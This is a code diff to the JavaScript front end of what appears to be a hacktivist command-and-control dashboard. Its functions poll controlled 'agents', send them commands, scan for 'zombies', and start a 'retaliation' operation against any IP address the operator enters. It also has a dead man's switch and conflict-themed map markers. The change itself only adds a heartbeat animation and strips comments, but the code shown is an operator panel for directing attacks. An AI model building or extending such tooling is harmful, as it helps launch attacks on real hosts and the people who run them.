@@ -1,6 +1,6 @@
 // commander.js
 let agents = [];
-let zombieResults = [];
+let heartbeatActive = true;
 
 window.onload = function() {
   loadAgents();
@@ -9,24 +9,25 @@ window.onload = function() {
   initMap();
   setInterval(loadAgents, 10000);
   setInterval(loadIntelFeed, 15000);
+  startHeartbeat();
 };
 
-// Peta
+function startHeartbeat() {
+  const heartbeat = document.getElementById('heartbeat');
+  setInterval(() => {
+    if (heartbeatActive) {
+      heartbeat.style.animation = "heartbeat 1.2s ease-in-out infinite";
+    }
+  }, 1000);
+}
+
 function initMap() {
   const map = L.map('map').setView([20, 0], 2);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-
-  // Gaza
-  L.marker([31.5, 34.5]).addTo(map)
-    .bindPopup("🇵🇸 Gaza — Under Attack")
-    .openPopup();
-
-  // Jakarta
-  L.marker([-6.2, 106.8]).addTo(map)
-    .bindPopup("🇮🇩 Jakarta — Anti-Corruption Ops");
+  L.marker([31.5, 34.5]).addTo(map).bindPopup("🇵🇸 Gaza — Under Attack").openPopup();
+  L.marker([-6.2, 106.8]).addTo(map).bindPopup("🇮🇩 Jakarta — Anti-Corruption Ops");
 }
 
-// Load Agents
 function loadAgents() {
   fetch('/api/agents')
     .then(r => r.json())
@@ -76,12 +77,10 @@ function sendCommand(cmd) {
   }).then(() => alert(`Perintah "${cmd}" dikirim`));
 }
 
-// Zombie Hunter
 function scanZombie() {
   const keyword = document.getElementById('keyword').value || 'palestine';
   const resultsDiv = document.getElementById('zombie-results');
   resultsDiv.innerHTML = '🔍 Memindai...';
-
   fetch('/api/zombie/scan', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -99,7 +98,6 @@ function scanZombie() {
   });
 }
 
-// Retaliation
 function retaliate() {
   const ip = document.getElementById('retaliate-ip').value;
   if (!ip) return alert("Masukkan IP!");
@@ -110,7 +108,6 @@ function retaliate() {
   }).then(() => alert('⚔️ Operasi dimulai!'));
 }
 
-// Intel Feed
 function loadIntelFeed() {
   fetch('/api/intel')
     .then(r => r.json())
@@ -122,7 +119,6 @@ function loadIntelFeed() {
     });
 }
 
-// Dead Man's Switch
 function openModal() { document.getElementById('switch-modal').style.display = 'block'; }
 function closeModal() { document.getElementById('switch-modal').style.display = 'none'; }
 function activateSwitch() { openModal(); }
